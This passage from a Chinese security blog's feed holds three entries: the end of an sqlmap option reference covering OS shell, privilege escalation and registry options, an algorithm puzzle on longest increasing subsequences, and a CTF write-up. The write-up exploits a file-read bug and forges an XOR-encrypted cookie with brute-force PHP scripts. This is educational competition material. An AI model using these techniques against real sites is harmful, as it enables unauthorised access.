<li>–shared-lib=SHLIB 共享库的本地路径</li>
</ul>
<p><strong>File system access（访问文件系统）：</strong></p>
<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<ul>
<li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</li>
<li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
<li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li>
</ul>
<p><strong>Operating system access（操作系统访问）：</strong></p>
<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
<ul>
<li>–os-cmd=OSCMD 执行操作系统命令</li>
<li>–os-shell 交互式的操作系统的shell</li>
<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
<li>–os-bof 存储过程缓冲区溢出利用</li>
<li>–priv-esc 数据库进程用户权限提升</li>
<li>–msf-path=MSFPATH Metasploit Framework本地的安装路径</li>
<li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li>
</ul>
<p><strong>Windows注册表访问：</strong></p>
<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
<ul>
<li>–reg-read 读一个Windows注册表项值</li>
<li>–reg-add 写一个Windows注册表项值数据</li>
<li>–reg-del 删除Windows注册表键值</li>
<li>–reg-key=REGKEY Windows注册表键</li>
<li>–reg-value=REGVAL Windows注册表项值</li>
<li>–reg-data=REGDATA Windows注册表键值数据</li>
<li>–reg-type=REGTYPE Windows注册表项值类型</li>
</ul>
<p>这些选项可以用来设置一些一般的工作参数。</p>
<ul>
<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
<li>–flush-session 刷新当前目标的会话文件</li>
<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
<li>–eta 显示每个输出的预计到达时间</li>
<li>–update 更新SqlMap</li>
<li>–save file保存选项到INI配置文件</li>
<li>–batch 从不询问用户输入，使用所有默认配置。</li>
</ul>
<p><strong>Miscellaneous（杂项）：</strong></p>
<ul>
<li>–beep 发现SQL注入时提醒</li>
<li>–check-payload IDS对注入payloads的检测测试</li>
<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
<li>–forms 对目标URL的解析和测试形式</li>
<li>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
<li>–page-rank Google dork结果显示网页排名（PR）</li>
<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
<li>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</li>
<li>–wizard 给初级用户的简单向导界面</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://sqlmap.org/&quot;&gt;sqlmap&lt;/a&gt;是渗透中常用的一个注入工具，使用python语言编写，简单易用，这里记下一些常用的并且网上搜集整理的使用方法，更多复杂的使用用上再说，主要记下最常用的sql注入一条龙命令。&lt;/p&gt;
&lt;p&gt;sqlmap支持五种不同的注入模式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。&lt;br&gt;2、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。&lt;br&gt;3、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。&lt;br&gt;4、联合查询注入，可以使用union的情况下的注入。&lt;br&gt;5、堆查询注入，可以同时执行多条语句的执行时的注入。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="实用工具" scheme="http://ug1y.github.io/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="sql注入" scheme="http://ug1y.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2017完美世界算法工程师笔试题(子序列)</title>
    <link href="http://ug1y.github.io/2016/09/25/2017%E5%AE%8C%E7%BE%8E%E4%B8%96%E7%95%8C%E7%AE%97%E6%B3%95%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%AC%94%E8%AF%95%E9%A2%98(%E5%AD%90%E5%BA%8F%E5%88%97)/"/>
    <id>http://ug1y.github.io/2016/09/25/2017完美世界算法工程师笔试题(子序列)/</id>
    <published>2016-09-25T09:55:23.000Z</published>
    <updated>2016-09-25T14:25:15.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微信上偶然看到的一道算法题，觉得很有意思，于是想来试试，毕竟标题写个完美世界，就兴致来了，题目如下：</p>
<blockquote>
<p>给定一个长度为N的数组，找出一个最长的单调自增子序列（不一定连续，但是顺序不能乱） 例如：给定一个长度为8的数组A{1,3,5,2,4,6,7,8}，则其最长的单调递增子序列为{1,2,4,6,7,8}，长度为6。<br><a id="more"></a><br><strong>输入描述:</strong><br>第一行包含一个整数T，代表测试数据组数。<br>对于每组测试数据： N-数组的长度<br>a1 a2 … an （需要计算的数组）<br>保证： 1&lt;=N&lt;=3000,0&lt;=ai&lt;=MAX_INT.</p>
<p><strong>输出描述:</strong><br>对于每组数据，输出一个整数，代表最长递增子序列的长度。</p>
<p><strong>输入例子:</strong><br>2<br>7<br>89 256 78 1 46 78 8<br>5<br>6 4 8 2 17</p>
<p><strong>输出例子:</strong><br>3<br>3</p>
</blockquote>
<h1 id="我的方法："><a href="#我的方法：" class="headerlink" title="我的方法："></a>我的方法：</h1><p>看到这个题之后，想看能不能用递归的方法，先拆分成小的序列，得到结果，再合并另一个序列，得到结果，一直到所有的序列。所以首先想到的是利用动态规划的思想，先把序列分成子序列，每个子序列都是有序的，再对每两个相邻子序列求得其最长子序列作为一组新的序列集合。每进行一次这样的运算，序列集合的数量就减1，最终就能得到所有序列的最长子序列了。</p>
<p>例如将序列<code>[1,4,6,2,4,3,8]</code>拆分成<code>[1,4,6]</code>，<code>[2,4]</code>，<code>[3,8]</code>三个子序列，每两个子序列合并形成一个新的最长子序列如<code>[1,4,6]</code>，<code>[2,3,8]</code>，最后合并两个子序列得到最终结果<code>[1,2,3,8]</code>即是最长子序列，长度为4。当然，结果肯定不唯一，比方说在第一步中<code>[1,4,6]</code>和<code>[1,2,4]</code>都是最长的，随便选一个就行，或者可以枚举出所有结果。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">q1=[<span class="number">89</span>,<span class="number">256</span>,<span class="number">78</span>,<span class="number">1</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">8</span>]</div><div class="line"></div><div class="line">q2=[<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">17</span>]</div><div class="line"></div><div class="line"><span class="comment"># 合并两个序列，按照顺序左合并、右合并，比较结果返回最长的那个</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(q1,q2)</span>:</span></div><div class="line">	t1=[i <span class="keyword">for</span> i <span class="keyword">in</span> q1 <span class="keyword">if</span> i &lt; q2[<span class="number">0</span>]] + q2</div><div class="line">	t2=q1 + [i <span class="keyword">for</span> i <span class="keyword">in</span> q2 <span class="keyword">if</span> i &gt; q1[<span class="number">-1</span>]]</div><div class="line">	<span class="keyword">return</span> t1 <span class="keyword">if</span> len(t1) &gt; len(t2) <span class="keyword">else</span> t2</div><div class="line"></div><div class="line"><span class="comment"># 拆分序列成有序子序列集合</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">split</span><span class="params">(seq)</span>:</span></div><div class="line">	j=<span class="number">0</span></div><div class="line">	t=[]</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(seq)<span class="number">-1</span>):</div><div class="line">		<span class="keyword">if</span> seq[i]&gt;seq[i+<span class="number">1</span>]:</div><div class="line">			t.append(seq[j:i+<span class="number">1</span>])</div><div class="line">			j=i+<span class="number">1</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		t.append(seq[j:len(seq)+<span class="number">1</span>])</div><div class="line">	<span class="keyword">return</span> t</div><div class="line"></div><div class="line"><span class="comment"># 递归排序，直到合并成一个序列则返回长度</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rank</span><span class="params">(ls)</span>:</span></div><div class="line">	<span class="keyword">if</span> len(ls)==<span class="number">1</span>:</div><div class="line">		<span class="keyword">return</span> ls[<span class="number">0</span>]</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> rank([merge(ls[i],ls[i+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ls)<span class="number">-1</span>)])</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">print</span> rank(split(q1))</div><div class="line">	<span class="keyword">print</span> rank(split(q2))</div></pre></td></tr></table></figure>
<h1 id="大神们的方法："><a href="#大神们的方法：" class="headerlink" title="大神们的方法："></a>大神们的方法：</h1><p>维护一个最长序列记录的数组V[i]，用来记录长度为i的递增子序列中最大元素的最小值，并对于数组中的每个元素考察其是哪个子序列的最大元素，用二分法更新V数组，最终i的值就是最长递增子序列的长度。</p>
<p>例如序列<code>[1,4,6,2,4,3,8]</code>，从左至右遍历一遍，先分别将<code>1,4,6</code>加入序列得到数组为<code>[1,4,6]</code>，遍历下一个元素<code>2</code>，小于数组的最后一个元素<code>6</code>，于是用二分法找到它在数组中的位置，替换原来的那个大的数，得到<code>[1,2,6]</code>，继续遍<code>4</code>，比<code>6</code>小比<code>2</code>大，于是替换了<code>6</code>得到数组<code>[1,2,4]</code>，继续遍历得到<code>[1,2,3]</code>，最终得到结果是<code>[1,2,3,8]</code>得出长度为4。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">q1=[<span class="number">89</span>,<span class="number">256</span>,<span class="number">78</span>,<span class="number">1</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">8</span>]</div><div class="line"></div><div class="line">q2=[<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">17</span>]</div><div class="line"></div><div class="line"><span class="comment"># 动态增长last最长序列数组，遍历seq序列，大于最后一个数则添加到末尾，小于则替换数组原来的大的数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lastseq</span><span class="params">(seq)</span>:</span></div><div class="line">	last=[]</div><div class="line">	last.append(seq[<span class="number">0</span>])</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(seq)):</div><div class="line">		<span class="keyword">if</span> seq[i]&gt;last[<span class="number">-1</span>]:</div><div class="line">			last.append(seq[i])</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			last[search(last,seq[i])]=seq[i]</div><div class="line">	<span class="keyword">return</span> len(last)</div><div class="line"></div><div class="line"><span class="comment"># 二分法找到元素x在有序序列seq中的位置，用小的替换大的数值，于是返回left</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(seq,x)</span>:</span></div><div class="line">	left=<span class="number">0</span></div><div class="line">	right=len(seq)<span class="number">-1</span></div><div class="line">	<span class="keyword">while</span> left&lt;=right:</div><div class="line">		mid=left+(right-left)/<span class="number">2</span></div><div class="line">		<span class="keyword">if</span> seq[mid]&lt;x:</div><div class="line">			left=mid+<span class="number">1</span></div><div class="line">		<span class="keyword">elif</span> seq[mid]&gt;x:</div><div class="line">			right=mid<span class="number">-1</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">return</span> mid</div><div class="line">	<span class="keyword">return</span> left</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">print</span> lastseq(q1)</div><div class="line">	<span class="keyword">print</span> lastseq(q2)</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要说复杂度把，第二个方法用了二分查找，复杂度肯定是要更优的。但是如果仔细分析可以知道，第一个方法是可以把所有最长的子序列枚举或者说排列组合出来的，而第二个方法得到的序列不是合理的最长子序列（只是例子恰好满足，不信的可以用其他示例跑一遍程序），但是长度是满足条件的。</p>
<p>但是我们要审题，题目是要得到最长递增子序列的长度，<strong>只要长度就行</strong>，所以大神们的方法肯定就是标准答案了，再说其他的我也想不到了，这个方法细想一下还是很厉害的，这里学习了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;微信上偶然看到的一道算法题，觉得很有意思，于是想来试试，毕竟标题写个完美世界，就兴致来了，题目如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;给定一个长度为N的数组，找出一个最长的单调自增子序列（不一定连续，但是顺序不能乱） 例如：给定一个长度为8的数组A{1,3,5,2,4,6,7,8}，则其最长的单调递增子序列为{1,2,4,6,7,8}，长度为6。&lt;br&gt;
    
    </summary>
    
      <category term="算法" scheme="http://ug1y.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>一道文件包含和自加密的题</title>
    <link href="http://ug1y.github.io/2016/09/07/%E4%B8%80%E9%81%93%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E8%87%AA%E5%8A%A0%E5%AF%86%E7%9A%84%E9%A2%98/"/>
    <id>http://ug1y.github.io/2016/09/07/一道文件包含和自加密的题/</id>
    <published>2016-09-07T13:37:10.000Z</published>
    <updated>2016-09-07T15:34:20.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>这是一道脑洞比较大的题，反正我是没做出来，看了各位大神的解答之后理清了一遍思路才搞定的，来自7月<a href="">X-NUCA全国高校网安联赛</a>的指导题目21，题目链接<a href="http://218.76.35.75:20106" target="_blank" rel="external">http://218.76.35.75:20106</a>，不知道合天会不会一直挂着题目。然而这次的<a href="http://www.ichunqiu.com/racing/ctf_54791" target="_blank" rel="external">“百度杯”CTF比赛</a>又出现了，很有意思。<br><a id="more"></a></p>
<h1 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h1><p>第一步当然是打开网页看看是个什么东西，看到是一美女（嗯，长的不错啊，难道是福利？？？），链接跳转变成 <code>http://218.76.35.75:20106/index.php?image=heihei.jpg</code>。</p>
<p><img src="/images/ctf_20160907220035.png" alt=""></p>
<p>一看以为是图像隐藏，把图片down下来放到神器Stegsolve里看，结果也没发现什么，后来想想这是道Web题，真是脑子笨经验少，赶紧右击查看源代码，发现图像竟然是用base64编码加载二进制数据显示的。（表示不知道还可以这样，无敌）</p>
<p><img src="/images/ctf_20160907220643.png" alt=""></p>
<p>这里可以猜测，后台用<code>file_get_contents()</code>函数获取参数指定的文件内容，然后再base64编码发送的文件包含漏洞，于是想到可以反射<code>index.php</code>文件。</p>
<p><img src="/images/ctf_20160907221848.png" alt=""></p>
<h1 id="Continue"><a href="#Continue" class="headerlink" title="Continue"></a>Continue</h1><p>拿着编码值去解码，得到了<code>index.php</code>的代码。（注意前面的<code>data:image/png;base64,</code>内容删掉再解码）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line"> * User: pfven</div><div class="line"> * Date: 2016/7/20</div><div class="line"> * Time: 21:35</div><div class="line"> */</div><div class="line"><span class="keyword">include</span> <span class="string">'header.php'</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"image"</span>]))&#123;</div><div class="line">    $file = $_GET[<span class="string">'image'</span>];</div><div class="line">    $file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line">    $file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</div><div class="line">    $txt = base64_encode(file_get_contents($file));</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span> &#123;</div><div class="line">     header(<span class="string">"Location: index.php?image=heihei.jpg"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">'footer.php'</span>;</div><div class="line"><span class="comment">//***</span></div></pre></td></tr></table></figure>
<p>看半天也没什么特别的，就是获取文件内容编码输出罢了，同时对参数名进行了过滤并且把config替换成下划线_了。但是在这里有个隐藏信息，就是该文件是由<code>PhpStorm</code>程序创建的，这是一个编辑php工程的IDE，它创建工程时会为项目创建相应的配置文件放入目录<code>.idea</code>下，于是访问一下这个目录，看看会有什么。</p>
<p><img src="/images/ctf_20160907223216.png" alt=""></p>
<p>果然，发现一堆xml文件，都是项目的配置文件，逐个翻阅后，发现<code>workspace.xml</code>中有项目中生成文件的列表，一个名叫<code>function_crypt.php</code>的文件看来就是存着flag的文件了。</p>
<p><img src="/images/ctf_20160907223622.png" alt=""></p>
<p>直接用链接访问返回<code>It&#39;s Works!</code>，看来里面还有奥秘，继续用同样方法看看文件源码，不过要注意下划线_是会过滤的，要用config来代替，于是得到源码如下：</p>
<p><img src="/images/ctf_20160907224345.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line"> * User: pfven</div><div class="line"> * Date: 2016/7/20</div><div class="line"> * Time: 17:19</div><div class="line"> */</div><div class="line"></div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</div><div class="line">    &#125;</div><div class="line">    $txt = $tmp;</div><div class="line">    $rnd=random(<span class="number">4</span>);</div><div class="line">    $key=md5($rnd.$key);</div><div class="line">    $s=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">    $txt=base64_decode($txt);</div><div class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</div><div class="line">    $txt = substr($txt,<span class="number">4</span>);</div><div class="line">    $key=md5($rnd.$key);</div><div class="line"></div><div class="line">    $s=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">        $tmp .= $txt[$i]^$key[++$s];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</div><div class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $tmp1;</div><div class="line">&#125;</div><div class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</div><div class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</div><div class="line">    <span class="keyword">echo</span> <span class="string">"It's Works!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h1><p>没完了，题目还是很强。首先来解读一下这段程序代码是什么意思。密钥<code>$key</code>看来是存在<code>config.php</code>文件里的了，设置user的cookie，由guest字符串加密得来的，要想通过获取到flag必须使得cookie中user键的值解密后为system才行。</p>
<p>解读一下加解密函数，加密函数如下:（解密函数反过来）</p>
<ol>
<li>把字符串中的每个字符位移10位</li>
<li>生成4位随机字符串与密钥做MD5哈希</li>
<li>循环与位移后的文本做异或运算</li>
<li>为了能反向解密，把4位随机字符串拼接到加密后的文本前面base64编码返回</li>
</ol>
<p>由于是做异或运算，再做一次异或运算就能返回原先的内容，于是base64解码后取出对应位置的文本字符，先异或原先的字符，再异或想要变成的字符就可以，不过要注意文本被位移了。基于以上代码，添加测试一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line">$key=<span class="string">'hello'</span>;</div><div class="line">$a=encrypt(<span class="string">'guest'</span>,$key);</div><div class="line">$a=base64_decode($a);</div><div class="line">$a[<span class="number">4</span>]=$a[<span class="number">4</span>]^chr(ord(<span class="string">'g'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">5</span>]=$a[<span class="number">5</span>]^chr(ord(<span class="string">'u'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'y'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">6</span>]=$a[<span class="number">6</span>]^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">7</span>]=$a[<span class="number">7</span>]^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">8</span>]=$a[<span class="number">8</span>]^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>);</div><div class="line">$aa=base64_encode($a);</div><div class="line"><span class="keyword">echo</span> decrypt($aa,$key);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>经过测试最后果真返回了我们想要的结果：</p>
<p><img src="/images/ctf_20160907231024.png" alt=""></p>
<p>问题在于最后还有一位要是字符m，这里就要用穷举来猜测了。因为在php中MD5哈希得到的是十六进制串，1到f，所以总共猜测16次便可得知，编写脚本得到十六个可能的base64编码值，然后循环发送请求获取结果，先从cookie中拿到编码值<code>VjhLV0lIDkxM</code>，编写脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line">$a=<span class="string">'VjhLV0lIDkxM'</span>;</div><div class="line">$a=base64_decode($a);</div><div class="line">$a[<span class="number">4</span>]=$a[<span class="number">4</span>]^chr(ord(<span class="string">'g'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">5</span>]=$a[<span class="number">5</span>]^chr(ord(<span class="string">'u'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'y'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">6</span>]=$a[<span class="number">6</span>]^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">7</span>]=$a[<span class="number">7</span>]^chr(ord(<span class="string">'s'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>);</div><div class="line">$a[<span class="number">8</span>]=$a[<span class="number">8</span>]^chr(ord(<span class="string">'t'</span>)+<span class="number">10</span>)^chr(ord(<span class="string">'e'</span>)+<span class="number">10</span>);</div><div class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</div><div class="line">    $ss=chr(ord(<span class="string">'0'</span>)+$i);</div><div class="line">    $a[<span class="number">9</span>]=chr(ord($ss))^chr(ord(<span class="string">'m'</span>)+<span class="number">10</span>);</div><div class="line">    $aa=base64_encode($a);</div><div class="line">    <span class="keyword">echo</span> $aa.<span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>得到一堆编码值，存储到<code>code.txt</code>文件中。</p>
<p><img src="/images/ctf_20160907231836.png" alt=""></p>
<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>拿到burpsuite里的Intruder跑一遍，加载字典</p>
<p><img src="/images/ctf_20160907232926.png" alt=""></p>
<p>最终，那个长度不一样的请求，就会显示我们要的flag结果</p>
<p><img src="/images/ctf_20160907233005.png" alt=""></p>
